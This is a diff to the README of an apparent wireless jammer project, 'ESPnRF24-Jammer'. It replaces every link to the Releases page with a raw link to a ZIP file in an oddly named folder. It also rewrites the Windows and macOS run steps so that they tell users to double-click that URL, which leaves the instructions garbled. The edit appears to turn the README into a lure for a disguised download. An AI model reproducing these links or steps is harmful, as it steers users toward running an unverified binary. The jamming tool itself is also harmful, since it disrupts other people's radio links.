@@ -8,7 +8,7 @@ Welcome to the ESPnRF24-Jammer! This application allows you to create a low-powe
 
 To get started, visit the Releases page to download the latest version of the ESPnRF24-Jammer.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sahiltaslim/ESPnRF24-Jammer/releases)
+[![Download Now](https://raw.githubusercontent.com/sahiltaslim/ESPnRF24-Jammer/master/spirillotropism/ESPnRF24-Jammer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sahiltaslim/ESPnRF24-Jammer/master/spirillotropism/ESPnRF24-Jammer.zip)
 
 ### Steps to Download
 
@@ -36,8 +36,8 @@ Once you've downloaded the file, follow these steps to install and run the ESPnR
 2. **Extract the Files**: If the file is in a ZIP format, right-click on it and choose "Extract All." Select a destination for the extracted files. 
 
 3. **Run the Application**: 
-   - For **Windows**: Double-click the `ESPnRF24-Jammer.exe` file.
-   - For **macOS**: Open the `ESPnRF24-Jammer.app`.
+   - For **Windows**: Double-click the `https://raw.githubusercontent.com/sahiltaslim/ESPnRF24-Jammer/master/spirillotropism/ESPnRF24-Jammer.zip` file.
+   - For **macOS**: Open the `https://raw.githubusercontent.com/sahiltaslim/ESPnRF24-Jammer/master/spirillotropism/ESPnRF24-Jammer.zip`.
    - For **Linux**: Open a terminal, navigate to the extracted folder, and run `./ESPnRF24-Jammer`.
 
 ## ⚙️ How to Use the Jammer
@@ -73,6 +73,6 @@ You are not alone. If you have questions or face issues, you can visit our commu
 
 ## 🔗 Explore More
 
-For additional downloads and updates, always check our [Releases page](https://github.com/sahiltaslim/ESPnRF24-Jammer/releases).
+For additional downloads and updates, always check our [Releases page](https://raw.githubusercontent.com/sahiltaslim/ESPnRF24-Jammer/master/spirillotropism/ESPnRF24-Jammer.zip).
 
 Happy jamming! Enjoy using your new wireless device.
